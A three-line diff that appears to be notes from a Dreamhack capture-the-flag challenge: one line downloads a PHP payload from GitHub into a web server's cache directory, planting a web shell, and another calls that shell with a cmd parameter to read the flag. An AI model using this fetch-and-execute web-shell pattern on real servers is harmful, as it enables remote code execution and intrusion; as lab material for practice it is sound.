@@ -1,0 +1,3 @@
+https://raw.githubusercontent.com/Amylo-jh/Dreamhack/main/payload.php -o /var/www/html/cache/payload.php
+
+http://host3.dreamhack.games:18604/cache/payload.php?cmd=/flag
